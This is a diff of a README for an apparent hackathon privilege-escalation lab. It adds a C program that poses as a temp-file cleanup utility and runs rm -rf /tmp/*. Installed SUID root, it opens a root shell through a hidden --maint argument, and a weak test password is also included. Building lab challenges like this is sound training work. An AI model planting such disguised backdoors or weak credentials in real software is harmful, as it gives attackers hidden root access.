@@ -50,28 +50,29 @@ This section details how to set up the challenge on a Windows machine using WSL2
 6. **Test Locally**:
    - SSH into the container: `ssh tester@localhost -p 2222` (password: `password123`)
    - Verify the SUID binary: `find / -perm -4000 2>/dev/null`
-   - Run the exploit: `/usr/local/bin/vuln`, then `cat /root/flag.txt`
-
-7. **Push to GitHub**:
-   - Initialize Git: `git init`, `git add .`, `git commit -m "Privilege escalation challenge"`
-   - Push to GitHub: `git remote add origin <repo-url>`, `git push -u origin main`
-   - Ensure your partner has access for integration.
-
-8. **Cloud Deployment (Optional)**:
-   - Push the image to Docker Hub: `docker tag privesc-lab <your-dockerhub>/privesc-lab:latest`, `docker push <your-dockerhub>/privesc-lab:latest`
-   - Deploy on AWS ECS/EC2, ensuring SSH port 22 is open only to authorized IPs.
+   - Run the exploit: `/usr/local/bin/vuln --maint`
 
 ### File Contents
 - **vuln.c**:
   ```c
-  #include <stdio.h>
-  #include <stdlib.h>
-  #include <unistd.h>
-  int main() {
-      setuid(0);
-      system("/bin/bash");
-      return 0;
-  }
+   #include <stdio.h>
+   #include <stdlib.h>
+   #include <unistd.h>
+   #include <string.h>
+
+   int main(int argc, char *argv[]) {
+       printf("System Cleanup Utility v1.2\n");
+       printf("Performing temporary files cleanup...\n");
+       system("rm -rf /tmp/* 2>/dev/null");
+       printf("Cleanup complete.\n");
+
+       // Hidden privilege escalation trigger
+       if (argc > 1 && strcmp(argv[1], "--maint") == 0) {
+           setuid(0);
+           system("/bin/bash");
+       }
+       return 0;
+   }
   ```
 - **Dockerfile**:
   ```dockerfile
@@ -103,10 +104,6 @@ This section details how to set up the challenge on a Windows machine using WSL2
    gcc -o /usr/local/bin/vuln vuln.c \
        && chown root:root /usr/local/bin/vuln \
        && chmod 4755 /usr/local/bin/vuln
-   # Create the flag file
-   echo "FLAG{hackathon_privesc_success_2025}" > /root/flag.txt \
-       && chown root:root /root/flag.txt \
-       && chmod 600 /root/flag.txt
    # Configure SSH
    mkdir -p /var/run/sshd
    echo 'PermitRootLogin no' >> /etc/ssh/sshd_config
@@ -147,18 +144,16 @@ You have SSH access to a server as the user `tester`. Your goal is to escalate p
    - The binary is owned by `root` and has the SUID bit set, meaning it runs with root privileges.
 
 4. **Exploit the Binary**:
-   - Execute the binary:
+   - Run the binary without arguments to perform a standard cleanup operation:
      ```bash
      /usr/local/bin/vuln
      ```
-   - This spawns a root shell (prompt changes to `root@...`).
-
-5. **Read the Flag**:
-   - In the root shell, read the flag file:
+   - This executes a cleanup of temporary files (/tmp/*) but does not provide root privileges.
+   - To spawn a root shell, execute the binary with the --maint argument:
      ```bash
-     cat /root/flag.txt
+     /usr/local/bin/vuln --maint
      ```
-   - The flag is: `FLAG{hackathon_privesc_success_2025}`
+   - This triggers the hidden privilege escalation feature, granting a root shell.
 
 ### Hints
 - Look for binaries with the SUID bit set, as they may allow privilege escalation.
@@ -179,10 +174,14 @@ You have SSH access to a server as the user `tester`. Your goal is to escalate p
 - All files (`vuln.c`, `Dockerfile`, `setup.sh`) are available in the GitHub repository: `<your-repo-url>`
 - Pushed by August 13, 2025, 8 PM, for integration and testing.
 
-<img width="946" height="687" alt="image" src="https://github.com/user-attachments/assets/e3fb7de8-a4b0-48d7-a85d-a519e54252aa" />
+<img width="954" height="949" alt="image" src="https://github.com/user-attachments/assets/29f470b4-fbb3-4563-9767-5688764f1a88" />
+
 
 ### Update: Disguised SUID Binary Behavior
 - The binary `/usr/local/bin/vuln` appears to be a normal maintenance tool that cleans temporary files.
 - Normal usage:
   ```bash
   /usr/local/bin/vuln
+- Exploit usage:
+  ```bash
+  /usr/local/bin/vuln --maint
